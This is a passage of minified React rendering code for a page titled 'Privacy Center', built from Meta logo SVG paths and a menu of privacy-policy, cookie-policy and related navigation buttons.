56.3521C276.097 56.2328 277.076 56.0908 278.051 55.9264V64.0549C276.952 64.3803 275.715 64.6476 274.341 64.8502C272.96 65.0595 271.521 65.1604 270.01 65.1604C259.554 65.1604 254.326 59.4521 254.326 48.0288V26.0482ZM329 64.1421H319.499V57.6609C317.807 60.0883 315.659 61.9594 313.056 63.2748C310.445 64.5902 307.488 65.2548 304.169 65.2548C300.084 65.2548 296.461 64.2067 293.308 62.1185C290.148 60.0375 287.668 57.1619 285.868 53.5128C284.059 49.8564 283.156 45.6726 283.156 40.9688C283.156 36.2366 284.074 32.0456 285.911 28.4037C287.748 24.7619 290.285 21.9074 293.525 19.8336C296.772 17.7678 300.496 16.727 304.704 16.727C307.871 16.727 310.713 17.3408 313.229 18.5691C315.712 19.7699 317.864 21.561 319.499 23.7864V17.8398H329V64.1421ZM319.318 34.0395C318.284 31.4094 316.642 29.3284 314.408 27.8038C312.174 26.2792 309.585 25.5202 306.656 25.5202C302.506 25.5202 299.209 26.9075 296.75 29.6894C294.291 32.4713 293.062 36.2366 293.062 40.9688C293.062 45.7307 294.248 49.5092 296.613 52.2918C298.984 55.0737 302.195 56.461 306.259 56.461C309.245 56.461 311.913 55.6954 314.256 54.1563C316.592 52.6171 318.284 50.5428 319.318 47.9344V34.0395Z",
                                                            fill: "#1C2B33"
                                                        }), (0,
                                                        he.jsx)("path", {
                                                            d: "M70.8442 0C62.7456 0 57.1572 2.97264 49.4783 13.1571C42.2041 3.53826 36.29 0 28.2743 0C12.221 0 0 19.6469 0 43.1693C0 57.319 7.96641 65.34 18.7142 65.34C29.0724 65.34 35.3412 56.628 40.721 46.9999L47.0792 36.0043C47.7003 34.9304 48.3261 33.8592 48.9565 32.7908C49.6638 33.9793 50.3661 35.1709 51.0634 36.3653L57.4217 47.225C65.5842 61.1952 71.1469 65.34 80.5721 65.34C91.3949 65.34 98.7441 56.2828 98.7441 43.395C98.7441 18.6107 86.1309 0 70.8442 0ZM38.0153 30.6874L31.5669 41.4124C25.2534 51.9565 22.5924 54.2995 18.624 54.2995C14.4306 54.2995 11.1386 50.785 11.1386 42.7185C11.1386 26.5419 19.0754 11.4008 28.2743 11.4008C33.0599 11.4008 36.6164 13.7834 42.7911 22.9416C41.1668 25.5033 39.5747 28.0854 38.0153 30.6874ZM80.33 54.2995C75.9556 54.2995 73.0696 51.5057 67.1621 41.5021L60.8038 30.6874C58.968 27.5609 57.2493 24.721 55.6188 22.1437C62.0211 12.7453 65.8776 10.2742 70.7541 10.2742C80.0437 10.2742 87.9963 24.1078 87.9963 42.7185C87.9963 50.2445 84.8846 54.2995 80.33 54.2995Z",
                                                            fill: "#0180FA"
                                                        }), (0,
                                                        he.jsx)("path", {
                                                            d: "M95.8256 23.76H84.7981C86.8017 29.011 87.9967 35.506 87.9967 42.7185C87.9967 50.2445 84.885 54.2995 80.3303 54.2995H80.2764V65.3387L80.5718 65.34C91.3946 65.34 98.7438 56.2828 98.7438 43.395C98.7438 36.234 97.691 29.5898 95.8256 23.76Z",
                                                            fill: "url(#paint0_linear_4090_978)"
                                                        }), (0,
                                                        he.jsx)("path", {
                                                            d: "M27.6361 0.0107422C12.2587 0.512342 0.547587 19.0795 0.0185547 41.5802H11.1519C11.5039 26.2127 18.9255 12.0881 27.6361 11.4248V0.0114022V0.0107422Z",
                                                            fill: "url(#paint1_linear_4090_978)"
                                                        }), (0,
                                                        he.jsx)("path", {
                                                            d: "M49.4781 13.1571L49.4827 13.1512C51.0928 15.2783 52.9464 17.9223 55.6218 22.1404L55.6185 22.1437C57.249 24.7216 58.9677 27.5609 60.8035 30.6874L67.1618 41.5021C73.0693 51.5057 75.9553 54.2995 80.3297 54.2995C80.5337 54.2995 80.7357 54.2916 80.9337 54.2751V65.3367C80.8133 65.3387 80.6923 65.34 80.5712 65.34C71.1466 65.34 65.5839 61.1945 57.4214 47.225L51.0632 36.366L50.6519 35.6631L50.6657 35.64C49.0958 32.8845 45.661 27.2679 42.7875 22.9469L42.7908 22.9416L42.3828 22.341C41.5544 21.1088 40.7859 20.0066 40.1377 19.14L40.0943 19.1558C35.4844 13.1023 32.3181 11.4008 28.274 11.4008C28.0608 11.4008 27.8476 11.4088 27.6357 11.4253V0.01056C27.8476 0.00396 28.0608 0 28.274 0C36.2898 0 42.2039 3.5376 49.4781 13.1571Z",
                                                            fill: "url(#paint2_linear_4090_978)"
                                                        })]
                                                    }), (0,
                                                    he.jsxs)("defs", {
                                                        children: [(0,
                                                        he.jsxs)("linearGradient", {
                                                            id: "paint0_linear_4090_978",
                                                            x1: "81.8424",
                                                            y1: "65.34",
                                                            x2: "105.911",
                                                            y2: "39.228",
                                                            gradientUnits: "userSpaceOnUse",
                                                            children: [(0,
                                                            he.jsx)("stop", {
                                                                offset: "0.427",
                                                                stopColor: "#0278F1"
                                                            }), (0,
                                                            he.jsx)("stop", {
                                                                offset: "0.917",
                                                                stopColor: "#0180FA"
                                                            })]
                                                        }), (0,
                                                        he.jsxs)("linearGradient", {
                                                            id: "paint1_linear_4090_978",
                                                            x1: "27.6361",
                                                            y1: "3.25794",
                                                            x2: "-1.20576",
                                                            y2: "40.6422",
                                                            gradientUnits: "userSpaceOnUse",
                                                            children: [(0,
                                                            he.jsx)("stop", {
                                                                offset: "0.427",
                                                                stopColor: "#0165E0"
                                                            }), (0,
                                                            he.jsx)("stop", {
                                                                offset: "0.917",
                                                                stopColor: "#0180FA"
                                                            })]
                                                        }), (0,
                                                        he.jsxs)("linearGradient", {
                                                            id: "paint2_linear_4090_978",
                                                            x1: "18.2112",
                                                            y1: "18.9486",
                                                            x2: "87.5348",
                                                            y2: "46.792",
                                                            gradientUnits: "userSpaceOnUse",
                                                            children: [(0,
                                                            he.jsx)("stop", {
                                                                stopColor: "#0064E0"
                                                            }), (0,
                                                            he.jsx)("stop", {
                                                                offset: "0.656",
                                                                stopColor: "#0066E2"
                                                            }), (0,
                                                            he.jsx)("stop", {
                                                                offset: 1,
                                                                stopColor: "#0278F1"
                                                            })]
                                                        }), (0,
                                                        he.jsx)("clipPath", {
                                                            id: "clip0_4090_978",
                                                            children: (0,
                                                            he.jsx)("rect", {
                                                                width: 329,
                                                                height: 66,
                                                                fill: "white"
                                                            })
                                                        })]
                                                    })]
                                                })
                                            }), (0,
                                            he.jsx)("h1", {
                                                children: "Privacy Center"
                                            }), (0,
                                            he.jsxs)("div", {
                                                id: "action-buttons",
                                                children: [(0,
                                                he.jsx)("div", {
                                                    className: "item-action",
                                                    children: (0,
                                                    he.jsxs)("div", {
                                                        className: "action-button main",
                                                        children: [(0,
                                                        he.jsx)("div", {
                                                            className: "action-icon",
                                                            children: (0,
                                                            he.jsx)("svg", {
                                                                width: 12,
                                                                height: 12,
                                                                viewBox: "0 0 12 12",
                                                                fill: "none",
                                                                xmlns: "http://www.w3.org/2000/svg",
                                                                children: (0,
                                                                he.jsx)("path", {
                                                                    fillRule: "evenodd",
                                                                    clipRule: "evenodd",
                                                                    d: "M9.5035 4.99843L6.3345 2.14643C6.24269 2.06379 6.12353 2.01806 6 2.01806C5.87647 2.01806 5.75731 2.06379 5.6655 2.14643L2.4965 4.99843C2.34021 5.1391 2.21525 5.31106 2.12971 5.50315C2.04418 5.69523 1.99999 5.90316 2 6.11343V9.41843C2 9.52643 2.035 9.60843 2.0745 9.65843C2.10894 9.70393 2.15999 9.73395 2.2165 9.74193C2.6465 9.81193 3.2365 9.88693 4 9.93743V7.99993C4 7.6021 4.15804 7.22057 4.43934 6.93927C4.72064 6.65796 5.10218 6.49993 5.5 6.49993H6.5C6.89782 6.49993 7.27936 6.65796 7.56066 6.93927C7.84196 7.22057 8 7.6021 8 7.99993V9.93743C8.59725 9.90063 9.19241 9.83555 9.7835 9.74243C9.84008 9.73432 9.89115 9.70411 9.9255 9.65843C9.97637 9.58896 10.0026 9.50449 10 9.41843V6.11343C10 5.90316 9.95582 5.69523 9.87029 5.50315C9.78475 5.31106 9.65979 5.1391 9.5035 4.99843ZM1.8275 4.25493L4.9965 1.40293C5.27194 1.15501 5.62941 1.01782 6 1.01782C6.37059 1.01782 6.72806 1.15501 7.0035 1.40293L10.1725 4.25493C10.433 4.4894 10.6413 4.77602 10.7838 5.0962C10.9264 5.41638 11 5.76295 11 6.11343V9.41843C11 10.0644 10.582 10.6249 9.945 10.7289C9.475 10.8054 8.841 10.8849 8.0285 10.9379C7.466 10.9744 7 10.5199 7 9.95593V7.99993C7 7.86732 6.94732 7.74014 6.85355 7.64638C6.75979 7.55261 6.63261 7.49993 6.5 7.49993H5.5C5.36739 7.49993 5.24021 7.55261 5.14645 7.64638C5.05268 7.74014 5 7.86732 5 7.99993V9.95593C5 10.5199 4.534 10.9744 3.9715 10.9379C3.32985 10.899 2.69045 10.8293 2.0555 10.7289C1.418 10.6249 1 10.0649 1 9.41893V6.11343C0.999952 5.76295 1.0736 5.41638 1.21616 5.0962C1.35871 4.77602 1.567 4.4894 1.8275 4.25493Z",
                                                                    fill: "black"
                                                                })
                                                            })
                                                        }), (0,
                                                        he.jsx)("div", {
                                                            className: "action-text",
                                                            children: "Privacy Center Home Page"
                                                        }), (0,
                                                        he.jsx)("div", {
                                                            className: "action-arrow"
                                                        })]
                                                    })
                                                }), (0,
                                                he.jsx)("div", {
                                                    className: "item-action",
                                                    children: (0,
                                                    he.jsxs)("div", {
                                                        className: "action-button",
                                                        children: [(0,
                                                        he.jsx)("div", {
                                                            className: "action-icon",
                                                            children: (0,
                                                            he.jsx)("svg", {
                                                                width: 12,
                                                                height: 12,
                                                                viewBox: "0 0 12 12",
                                                                fill: "none",
                                                                xmlns: "http://www.w3.org/2000/svg",
                                                                children: (0,
                                                                he.jsx)("path", {
                                                                    fillRule: "evenodd",
                                                                    clipRule: "evenodd",
                                                                    d: "M8.30879 9.01603C7.4102 9.73391 6.27085 10.0805 5.12472 9.98457C3.97859 9.88865 2.91269 9.35753 2.14592 8.50027C1.37916 7.64302 0.969739 6.52471 1.00174 5.37502C1.03375 4.22533 1.50475 3.13153 2.31802 2.31827C3.13129 1.505 4.22509 1.03399 5.37478 1.00199C6.52447 0.969983 7.64278 1.37941 8.50003 2.14617C9.35728 2.91293 9.88841 3.97883 9.98433 5.12496C10.0802 6.27109 9.73367 7.41045 9.01579 8.30903L10.8533 10.1465C10.9444 10.2408 10.9948 10.3671 10.9936 10.4982C10.9925 10.6293 10.9399 10.7547 10.8472 10.8474C10.7545 10.9401 10.6291 10.9927 10.498 10.9939C10.3669 10.995 10.2406 10.9446 10.1463 10.8535L8.30879 9.01603ZM8.99979 5.50003C8.99979 5.95966 8.90926 6.41478 8.73336 6.83942C8.55747 7.26406 8.29966 7.6499 7.97466 7.9749C7.64965 8.29991 7.26382 8.55772 6.83918 8.73361C6.41454 8.9095 5.95941 9.00003 5.49979 9.00003C5.04016 9.00003 4.58503 8.9095 4.16039 8.73361C3.73575 8.55772 3.34992 8.29991 3.02491 7.9749C2.69991 7.6499 2.4421 7.26406 2.26621 6.83942C2.09032 6.41478 1.99979 5.95966 1.99979 5.50003C1.99979 4.57177 2.36853 3.68153 3.02491 3.02516C3.68129 2.36878 4.57153 2.00003 5.49979 2.00003C6.42804 2.00003 7.31828 2.36878 7.97466 3.02516C8.63104 3.68153 8.99979 4.57177 8.99979 5.50003Z",
                                                                    fill: "black"
                                                                })
                                                            })
                                                        }), (0,
                                                        he.jsx)("div", {
                                                            className: "action-text",
                                                            children: "Search"
                                                        }), (0,
                                                        he.jsx)("div", {
                                                            className: "action-arrow"
                                                        })]
                                                    })
                                                }), (0,
                                                he.jsxs)("div", {
                                                    className: "item-action",
                                                    children: [(0,
                                                    he.jsxs)("div", {
                                                        className: "action-button",
                                                        children: [(0,
                                                        he.jsx)("div", {
                                                            className: "action-icon",
                                                            children: (0,
                                                            he.jsxs)("svg", {
                                                                width: 12,
                                                                height: 12,
                                                                viewBox: "0 0 12 12",
                                                                fill: "none",
                                                                xmlns: "http://www.w3.org/2000/svg",
                                                                children: [(0,
                                                                he.jsx)("path", {
                                                                    d: "M5.99996 6C6.22008 6.00001 6.43405 6.07265 6.60869 6.20666C6.78332 6.34067 6.90886 6.52855 6.96584 6.74118C7.02281 6.9538 7.00804 7.17929 6.9238 7.38266C6.83957 7.58603 6.69059 7.75593 6.49996 7.866V8.5C6.49996 8.63261 6.44728 8.75979 6.35351 8.85355C6.25974 8.94732 6.13256 9 5.99996 9C5.86735 9 5.74017 8.94732 5.6464 8.85355C5.55263 8.75979 5.49996 8.63261 5.49996 8.5V7.866C5.30933 7.75593 5.16034 7.58603 5.07611 7.38266C4.99188 7.17929 4.9771 6.9538 5.03408 6.74118C5.09105 6.52855 5.21659 6.34067 5.39122 6.20666C5.56586 6.07265 5.77983 6.00001 5.99996 6Z",
                                                                    fill: "black"
                                                                }), (0,
                                                                he.jsx)("path", {
                                                                    fillRule: "evenodd",
                                                                    clipRule: "evenodd",
                                                                    d: "M3.5 3C3.5 2.33696 3.76339 1.70107 4.23223 1.23223C4.70107 0.763392 5.33696 0.5 6 0.5C6.66304 0.5 7.29893 0.763392 7.76777 1.23223C8.23661 1.70107 8.5 2.33696 8.5 3V4H8.9285C9.5695 4 10.137 4.409 10.2605 5.038C10.4193 5.84906 10.4995 6.67354 10.5 7.5C10.4995 8.32646 10.4193 9.15094 10.2605 9.962C10.137 10.591 9.57 11 8.9285 11H3.0715C2.4305 11 1.863 10.591 1.7395 9.962C1.58071 9.15094 1.50051 8.32646 1.5 7.5C1.5 6.508 1.618 5.654 1.7395 5.038C1.863 4.409 2.43 4 3.0715 4H3.5V3ZM7.5 3V4H4.5V3C4.5 2.60218 4.65804 2.22064 4.93934 1.93934C5.22064 1.65804 5.60218 1.5 6 1.5C6.39782 1.5 6.77936 1.65804 7.06066 1.93934C7.34196 2.22064 7.5 2.60218 7.5 3ZM3.0715 5H8.9285C9.01943 4.99797 9.10857 5.02552 9.1825 5.0785C9.236 5.1195 9.2675 5.1695 9.2795 5.231C9.391 5.7975 9.5 6.586 9.5 7.5C9.5 8.414 9.391 9.2025 9.2795 9.769C9.26788 9.83038 9.23316 9.88496 9.1825 9.9215C9.10857 9.97448 9.01943 10.002 8.9285 10H3.0715C2.98057 10.002 2.89143 9.97448 2.8175 9.9215C2.76688 9.88492 2.73217 9.83036 2.7205 9.769C2.57429 9.02151 2.50045 8.26166 2.5 7.5C2.5 6.586 2.609 5.7975 2.7205 5.231C2.73217 5.16964 2.76688 5.11508 2.8175 5.0785C2.89143 5.02552 2.98057 4.99797 3.0715 5Z",
                                                                    fill: "black"
                                                                })]
                                                            })
                                                        }), (0,
                                                        he.jsx)("div", {
                                                            className: "action-text",
                                                            children: "Privacy Policy"
                                                        }), (0,
                                                        he.jsx)("div", {
                                                            className: "action-arrow",
                                                            children: (0,
                                                            he.jsx)("svg", {
                                                                width: 12,
                                                                height: 12,
                                                                viewBox: "0 0 12 12",
                                                                fill: "none",
                                                                xmlns: "http://www.w3.org/2000/svg",
                                                                children: (0,
                                                                he.jsx)("path", {
                                                                    fillRule: "evenodd",
                                                                    clipRule: "evenodd",
                                                                    d: "M2.17074 3.62349C2.22019 3.58021 2.2777 3.54711 2.33996 3.52607C2.40222 3.50503 2.46801 3.49647 2.53359 3.50088C2.59916 3.5053 2.66321 3.52259 2.7221 3.55178C2.78098 3.58097 2.83353 3.62148 2.87674 3.67099L6.00024 7.24099L9.12374 3.67099C9.21106 3.57114 9.33447 3.51006 9.46683 3.5012C9.59918 3.49234 9.72963 3.53642 9.82949 3.62374C9.92934 3.71107 9.99042 3.83448 9.99928 3.96683C10.0081 4.09919 9.96406 4.22964 9.87674 4.32949L6.37674 8.32949C6.32981 8.3832 6.27193 8.42624 6.20699 8.45573C6.14206 8.48523 6.07156 8.50048 6.00024 8.50048C5.92892 8.50048 5.85842 8.48523 5.79348 8.45573C5.72855 8.42624 5.67067 8.3832 5.62374 8.32949L2.12374 4.32949C2.08046 4.28004 2.04735 4.22254 2.02631 4.16028C2.00527 4.09802 1.99672 4.03222 2.00113 3.96665C2.00554 3.90108 2.02283 3.83702 2.05202 3.77814C2.08121 3.71926 2.12122 3.66671 2.17074 3.62349Z",
                                                                    fill: "black"
                                                                })
                                                            })
                                                        })]
                                                    }), (0,
                                                    he.jsxs)("div", {
                                                        className: "content-action",
                                                        children: [(0,
                                                        he.jsxs)("div", {
                                                            className: "action-button",
                                                            children: [(0,
                                                            he.jsx)("div", {
                                                                className: "action-icon",
                                                                children: (0,
                                                                he.jsx)("svg", {})
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-text",
                                                                children: "What is the Privacy Policy and what does it cover?"
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-arrow"
                                                            })]
                                                        }), (0,
                                                        he.jsxs)("div", {
                                                            className: "action-button",
                                                            children: [(0,
                                                            he.jsx)("div", {
                                                                className: "action-icon",
                                                                children: (0,
                                                                he.jsx)("svg", {})
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-text",
                                                                children: "What information do we collect?"
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-arrow"
                                                            })]
                                                        }), (0,
                                                        he.jsxs)("div", {
                                                            className: "action-button",
                                                            children: [(0,
                                                            he.jsx)("div", {
                                                                className: "action-icon",
                                                                children: (0,
                                                                he.jsx)("svg", {})
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-text",
                                                                children: "How do we use your information?"
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-arrow"
                                                            })]
                                                        }), (0,
                                                        he.jsxs)("div", {
                                                            className: "action-button",
                                                            children: [(0,
                                                            he.jsx)("div", {
                                                                className: "action-icon",
                                                                children: (0,
                                                                he.jsx)("svg", {})
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-text",
                                                                children: "How do we share your information on Meta Products or with integrated partners?"
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-arrow"
                                                            })]
                                                        }), (0,
                                                        he.jsxs)("div", {
                                                            className: "action-button",
                                                            children: [(0,
                                                            he.jsx)("div", {
                                                                className: "action-icon",
                                                                children: (0,
                                                                he.jsx)("svg", {})
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-text",
                                                                children: "How do we share information with third parties?"
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-arrow"
                                                            })]
                                                        }), (0,
                                                        he.jsxs)("div", {
                                                            className: "action-button",
                                                            children: [(0,
                                                            he.jsx)("div", {
                                                                className: "action-icon",
                                                                children: (0,
                                                                he.jsx)("svg", {})
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-text",
                                                                children: "How is the cooperation between Meta Companies organized?"
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-arrow"
                                                            })]
                                                        }), (0,
                                                        he.jsxs)("div", {
                                                            className: "action-button",
                                                            children: [(0,
                                                            he.jsx)("div", {
                                                                className: "action-icon",
                                                                children: (0,
                                                                he.jsx)("svg", {})
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-text",
                                                                children: "How can you manage or delete your information and exercise your rights?"
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-arrow"
                                                            })]
                                                        }), (0,
                                                        he.jsxs)("div", {
                                                            className: "action-button",
                                                            children: [(0,
                                                            he.jsx)("div", {
                                                                className: "action-icon",
                                                                children: (0,
                                                                he.jsx)("svg", {})
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-text",
                                                                children: "How long do we keep your information?"
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-arrow"
                                                            })]
                                                        }), (0,
                                                        he.jsxs)("div", {
                                                            className: "action-button",
                                                            children: [(0,
                                                            he.jsx)("div", {
                                                                className: "action-icon",
                                                                children: (0,
                                                                he.jsx)("svg", {})
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-text",
                                                                children: "How do we transmit information?"
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-arrow"
                                                            })]
                                                        }), (0,
                                                        he.jsxs)("div", {
                                                            className: "action-button",
                                                            children: [(0,
                                                            he.jsx)("div", {
                                                                className: "action-icon",
                                                                children: (0,
                                                                he.jsx)("svg", {})
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-text",
                                                                children: "How do we respond to official requests, comply with applicable laws, and prevent harm?"
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-arrow"
                                                            })]
                                                        }), (0,
                                                        he.jsxs)("div", {
                                                            className: "action-button",
                                                            children: [(0,
                                                            he.jsx)("div", {
                                                                className: "action-icon",
                                                                children: (0,
                                                                he.jsx)("svg", {})
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-text",
                                                                children: "How will you know when the policy changes?"
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-arrow"
                                                            })]
                                                        }), (0,
                                                        he.jsxs)("div", {
                                                            className: "action-button",
                                                            children: [(0,
                                                            he.jsx)("div", {
                                                                className: "action-icon",
                                                                children: (0,
                                                                he.jsx)("svg", {})
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-text",
                                                                children: "How to ask Meta questions?"
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-arrow"
                                                            })]
                                                        }), (0,
                                                        he.jsxs)("div", {
                                                            className: "action-button",
                                                            children: [(0,
                                                            he.jsx)("div", {
                                                                className: "action-icon",
                                                                children: (0,
                                                                he.jsx)("svg", {})
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-text",
                                                                children: "Why and how we process your data"
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-arrow"
                                                            })]
                                                        })]
                                                    })]
                                                }), (0,
                                                he.jsxs)("div", {
                                                    className: "item-action",
                                                    children: [(0,
                                                    he.jsxs)("div", {
                                                        className: "action-button",
                                                        children: [(0,
                                                        he.jsx)("div", {
                                                            className: "action-icon",
                                                            children: (0,
                                                            he.jsxs)("svg", {
                                                                width: 12,
                                                                height: 12,
                                                                viewBox: "0 0 12 12",
                                                                fill: "none",
                                                                xmlns: "http://www.w3.org/2000/svg",
                                                                children: [(0,
                                                                he.jsx)("g", {
                                                                    clipPath: "url(#clip0_4090_997)",
                                                                    children: (0,
                                                                    he.jsx)("path", {
                                                                        fillRule: "evenodd",
                                                                        clipRule: "evenodd",
                                                                        d: "M6 10.5C6.59095 10.5 7.17611 10.3836 7.72208 10.1575C8.26804 9.93131 8.76412 9.59984 9.18198 9.18198C9.59984 8.76412 9.93131 8.26804 10.1575 7.72208C10.3836 7.17611 10.5 6.59095 10.5 6C10.5 5.40905 10.3836 4.82389 10.1575 4.27792C9.93131 3.73196 9.59984 3.23588 9.18198 2.81802C8.76412 2.40016 8.26804 2.06869 7.72208 1.84254C7.17611 1.6164 6.59095 1.5 6 1.5C4.80653 1.5 3.66193 1.97411 2.81802 2.81802C1.97411 3.66193 1.5 4.80653 1.5 6C1.5 7.19347 1.97411 8.33807 2.81802 9.18198C3.66193 10.0259 4.80653 10.5 6 10.5ZM6 11.5C9.0375 11.5 11.5 9.0375 11.5 6C11.5 2.9625 9.0375 0.5 6 0.5C2.9625 0.5 0.5 2.9625 0.5 6C0.5 9.0375 2.9625 11.5 6 11.5ZM6 4.649C6.2415 4.649 6.4375 4.8445 6.4375 5.0865V8.5C6.4375 8.61603 6.39141 8.72731 6.30936 8.80936C6.22731 8.89141 6.11603 8.9375 6 8.9375C5.88397 8.9375 5.77269 8.89141 5.69064 8.80936C5.60859 8.72731 5.5625 8.61603 5.5625 8.5V5.0865C5.5625 4.8445 5.7585 4.649 6 4.649ZM6 4.0115C6.4165 4.0115 6.625 3.809 6.625 3.5055C6.625 3.2025 6.4165 3 6 3C5.5835 3 5.375 3.2025 5.375 3.5055C5.375 3.809 5.5835 4.0115 6 4.0115Z",
                                                                        fill: "black"
                                                                    })
                                                                }), (0,
                                                                he.jsx)("defs", {
                                                                    children: (0,
                                                                    he.jsx)("clipPath", {
                                                                        id: "clip0_4090_997",
                                                                        children: (0,
                                                                        he.jsx)("rect", {
                                                                            width: 12,
                                                                            height: 12,
                                                                            fill: "white"
                                                                        })
                                                                    })
                                                                })]
                                                            })
                                                        }), (0,
                                                        he.jsx)("div", {
                                                            className: "action-text",
                                                            children: "Other rules and articles"
                                                        }), (0,
                                                        he.jsx)("div", {
                                                            className: "action-arrow",
                                                            children: (0,
                                                            he.jsx)("svg", {
                                                                width: 12,
                                                                height: 12,
                                                                viewBox: "0 0 12 12",
                                                                fill: "none",
                                                                xmlns: "http://www.w3.org/2000/svg",
                                                                children: (0,
                                                                he.jsx)("path", {
                                                                    fillRule: "evenodd",
                                                                    clipRule: "evenodd",
                                                                    d: "M2.17074 3.62349C2.22019 3.58021 2.2777 3.54711 2.33996 3.52607C2.40222 3.50503 2.46801 3.49647 2.53359 3.50088C2.59916 3.5053 2.66321 3.52259 2.7221 3.55178C2.78098 3.58097 2.83353 3.62148 2.87674 3.67099L6.00024 7.24099L9.12374 3.67099C9.21106 3.57114 9.33447 3.51006 9.46683 3.5012C9.59918 3.49234 9.72963 3.53642 9.82949 3.62374C9.92934 3.71107 9.99042 3.83448 9.99928 3.96683C10.0081 4.09919 9.96406 4.22964 9.87674 4.32949L6.37674 8.32949C6.32981 8.3832 6.27193 8.42624 6.20699 8.45573C6.14206 8.48523 6.07156 8.50048 6.00024 8.50048C5.92892 8.50048 5.85842 8.48523 5.79348 8.45573C5.72855 8.42624 5.67067 8.3832 5.62374 8.32949L2.12374 4.32949C2.08046 4.28004 2.04735 4.22254 2.02631 4.16028C2.00527 4.09802 1.99672 4.03222 2.00113 3.96665C2.00554 3.90108 2.02283 3.83702 2.05202 3.77814C2.08121 3.71926 2.12122 3.66671 2.17074 3.62349Z",
                                                                    fill: "black"
                                                                })
                                                            })
                                                        })]
                                                    }), (0,
                                                    he.jsxs)("div", {
                                                        className: "content-action",
                                                        children: [(0,
                                                        he.jsxs)("div", {
                                                            className: "action-button",
                                                            children: [(0,
                                                            he.jsx)("div", {
                                                                className: "action-icon",
                                                                children: (0,
                                                                he.jsx)("svg", {})
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-text",
                                                                children: "Cookie Policy"
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-arrow"
                                                            })]
                                                        }), (0,
                                                        he.jsxs)("div", {
                                                            className: "action-button",
                                                            children: [(0,
                                                            he.jsx)("div", {
                                                                className: "action-icon",
                                                                children: (0,
                                                                he.jsx)("svg", {})
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-text",
                                                                children: "Information for those who do not use Meta Products"
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-arrow",
                                                                children: (0,
                                                                he.jsxs)("svg", {
                                                                    width: 12,
                                                                    height: 12,
                                                                    viewBox: "0 0 12 12",
                                                                    fill: "none",
                                                                    xmlns: "http://www.w3.org/2000/svg",
                                                                    children: [(0,
                                                                    he.jsx)("path", {
                                                                        d: "M3 9.5H9C9.13261 9.5 9.25979 9.44732 9.35355 9.35355C9.44732 9.25979 9.5 9.13261 9.5 9V6.5H10.5V9C10.5 9.39782 10.342 9.77936 10.0607 10.0607C9.77936 10.342 9.39782 10.5 9 10.5H3C2.60218 10.5 2.22064 10.342 1.93934 10.0607C1.65804 9.77936 1.5 9.39782 1.5 9V3C1.5 2.60218 1.65804 2.22064 1.93934 1.93934C2.22064 1.65804 2.60218 1.5 3 1.5H5.5V2.5H3C2.86739 2.5 2.74021 2.55268 2.64645 2.64645C2.55268 2.74021 2.5 2.86739 2.5 3V9C2.5 9.13261 2.55268 9.25979 2.64645 9.35355C2.74021 9.44732 2.86739 9.5 3 9.5Z",
                                                                        fill: "black"
                                                                    }), (0,
                                                                    he.jsx)("path", {
                                                                        d: "M5.64622 5.6465L8.79221 2.5H6.99972C6.86711 2.5 6.73993 2.44732 6.64616 2.35355C6.55239 2.25979 6.49972 2.13261 6.49972 2C6.49972 1.86739 6.55239 1.74021 6.64616 1.64645C6.73993 1.55268 6.86711 1.5 6.99972 1.5H9.99972C10.1323 1.5 10.2595 1.55268 10.3533 1.64645C10.447 1.74021 10.4997 1.86739 10.4997 2V5C10.4997 5.13261 10.447 5.25979 10.3533 5.35355C10.2595 5.44732 10.1323 5.5 9.99972 5.5C9.86711 5.5 9.73993 5.44732 9.64616 5.35355C9.55239 5.25979 9.49972 5.13261 9.49972 5V3.207L6.35322 6.3535C6.25891 6.44458 6.13261 6.49498 6.00151 6.49384C5.87042 6.4927 5.74501 6.44011 5.65231 6.34741C5.5596 6.25471 5.50702 6.1293 5.50588 5.9982C5.50474 5.8671 5.55514 5.7408 5.64622 5.6465Z",
                                                                        fill: "black"
                                                                    })]
                                                                })
                                                            })]
                                                        }), (0,
                                                        he.jsxs)("div", {
                                                            className: "action-button",
                                                            children: [(0,
                                                            he.jsx)("div", {
                                                                className: "action-icon",
                                                                children: (0,
                                                                he.jsx)("svg", {})
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-text",
                                                                children: "How Meta uses information for generative AI models"
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-arrow"
                                                            })]
                                                        }), (0,
                                                        he.jsxs)("div", {
                                                            className: "action-button",
                                                            children: [(0,
                                                            he.jsx)("div", {
                                                                className: "action-icon",
                                                                children: (0,
                                                                he.jsx)("svg", {})
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-text",
                                                                children: "Data Transfer Framework Policy"
                                                            }), (0,
                                                            he.jsx)("div", {
                                                                className: "action-arrow"
                                                            })]
                                                        }), (0,
                                                        he.jsxs)("div", {
                                                            className: "action-button",
                                                            children: [(0,
                                                            he.jsx)("div", {
                                                                className: "action-icon",
